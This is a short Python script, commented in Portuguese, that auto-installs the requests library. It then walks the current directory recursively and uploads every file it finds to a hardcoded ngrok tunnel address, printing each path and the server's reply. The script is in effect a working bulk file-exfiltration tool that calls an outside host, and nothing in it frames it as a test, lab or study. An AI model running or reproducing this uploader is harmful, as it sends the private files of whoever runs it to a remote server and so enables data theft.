import os
import sys
import subprocess

# função para instalar bibliotecas automaticamente
def instalar(pacote):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pacote])

# verificar requests
try:
    import requests
except ImportError:
    print("Instalando requests...")
    instalar("requests")
    import requests


SERVER_URL = "https://unreclining-melinda-intercarpellary.ngrok-free.dev"

pasta = os.getcwd()

print("Pasta atual:", pasta)

for root, dirs, files in os.walk(pasta):

    for file in files:

        caminho = os.path.join(root, file)

        print("Processando:", caminho)

        try:
            with open(caminho, "rb") as f:

                r = requests.post(
                    SERVER_URL,
                    files={"file": (file, f)}
                )

            print("Resposta:", r.text)

        except Exception as e:
            print("Erro:", e)
